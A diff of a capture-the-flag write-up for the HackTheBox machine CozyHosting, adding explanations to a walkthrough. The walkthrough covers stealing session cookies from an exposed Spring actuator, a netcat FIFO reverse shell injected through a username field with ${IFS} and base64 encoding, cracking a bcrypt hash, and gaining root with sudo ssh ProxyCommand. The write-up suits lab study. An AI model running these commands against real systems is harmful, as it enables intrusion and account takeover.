@@ -69,14 +69,7 @@ Target: http://cozyhosting.htb/
 [18:22:05] 401 -   97B  - /admin
 [18:22:08] 200 -  124KB - /actuator/beans
 [18:22:09] 200 -    0B  - /admin/%3bindex/
-[18:22:13] 200 -    0B  - /Admin;/
-[18:22:13] 200 -    0B  - /admin;/
-[18:22:44] 200 -    0B  - /axis//happyaxis.jsp
-[18:22:44] 200 -    0B  - /axis2//axis2-web/HappyAxis.jsp
-[18:22:44] 200 -    0B  - /axis2-web//HappyAxis.jsp
-[18:22:55] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
-[18:23:19] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
-[18:23:19] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
+[...]
 [18:23:20] 500 -   73B  - /error
 [18:23:22] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
 [18:23:23] 200 -    0B  - /extjs/resources//charts.swf
@@ -95,11 +88,13 @@ Okay now we can see that there are a lot of `/actuator/` folder and one in parti
 
 <img src="/assets/img/CozyHostingWriteup/cozy-2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
-This looks like session cookie, which mean that  we can try to access the `/admin` webpage using those cookies. Let's try to do that by launching burpsuite with intercept on:
+This looks like a session cookie. Session cookies are a variable that is given to a user once they are connected. The client will then show that cookie as a capability for every request sent after authentication. The server will have to check if the cookie that the client is giving is the same that the server gave to the client after authentication. But here, the web application is running Spring boot and has probably been badly configured, which means that we can access `/actuator/sessions` containing the session cookies (which should definitely be hidden).
+
+That means that  we can try to access the `/admin` webpage using those stolen cookies. Let's try to do that by launching burpsuite with intercept on:
 
 <img src="/assets/img/CozyHostingWriteup/cozy-3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
-We change the request by changing the `JSESSIONID` variable and...
+We change the request by changing the `JSESSIONID` variable (the sesssion cookie) and...
 
 <img src="/assets/img/CozyHostingWriteup/cozy-4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
@@ -124,14 +119,15 @@ Long story short we do :
 ```bash
 mknod /tmp/f p
 ```
-
-then :
+Here we make a pipe file called `f` and the flag `p` instruct that this pipe would be a FIFO (a queue), then we do :
 
 ```bash
 /bin/sh 0</tmp/f | nc 10.10.14.87 12345 1>/tmp/f
 ```
 
-The problem with all of this is that we cannot directly inject these into our username because it includes spaces and the `$Username` variable shouldn't contain spaces. In order to do this, we can replace spaces with the `${IFS}` variable.
+The first part, `/bin/sh 0</tmp/f`, makes it so a shell is created and takes our queue pipe as an input. Then whatever the shell outputs (as a results of any command) is passed to the next part of the command as input. The next part is waiting for the attacker's connection and writes anything coming from that connection to our pipe file. In a nutshell, we spawn a shell that takes our pipe file as input and then what the shell outputs is sent to our connection and when the attacker send something, it is written in our pipe thanks to `1>/tmp/f`
+
+The problem with any of this is that we cannot directly inject these into our username because it includes spaces and the `$Username` variable shouldn't contain spaces. In order to do this, we can replace spaces with the `${IFS}` variable.
 
 But in order to minimize the number of `${IFS}` variables, we might as well directly turn the payload in base64 and send it. If send  `;echo${IFS}"[PAYLOAD"]|base64${IFS}-d|bash;`, then it should expand to :
 
@@ -244,7 +240,7 @@ Looks like either `josh` or `laurel_` is the admin.
 
 ## Cracking the password
 
-We have to crack the admin password, let's first check chat kind of hash this is :
+We have to crack the admin password, let's first check chat kind of hash this is using the `hashid` command:
 
 ```
 kyll@kyll-Latitude-3520:~/Desktop/code_folder/HTB/CozyHosting$ hashid
@@ -255,7 +251,7 @@ Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
 [+] bcrypt 
 ```
 
-This is bcrypt, we can now use John the ripper to crack the password like this :
+This is bcrypt, we can now use John the ripper to crack the password using the `rockyou.txt` wordlist like this :
 
 ```
 kyll@kyll-Latitude-3520:~/Desktop/code_folder/HTB/CozyHosting$ john --format=bcrypt --wordlist=/home/kyll/Desktop/code_folder/Tools/rockyou.txt hash.txt 
@@ -276,9 +272,7 @@ So the password is `manchesterunited` ! Let's try connecting in ssh to one of th
 kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB/CozyHosting$ ssh josh@10.10.11.230
 josh@10.10.11.230's password: 
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
-
 [...]
-
 Last login: Fri Feb  2 14:16:11 2024 from 10.10.16.23
 josh@cozyhosting:~$ 
 ```
@@ -306,7 +300,8 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
 
-We can run `ssh` as root, this is our winning card. Using [this](https://gtfobins.github.io/gtfobins/ssh/) technique, we can instantly access `root` privilege :
+We can run `ssh` as root, this is our winning card. Using [this](https://gtfobins.github.io/gtfobins/ssh/) technique. What this does is summoning an `ssh` commands to itself, but then executes a `ProxyCommand` that spawns a shell as root (since we used sudo) and redirect `stdin` and `stdout` to `stderr`.
+We can instantly access `root` privilege :
 
 ```
 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
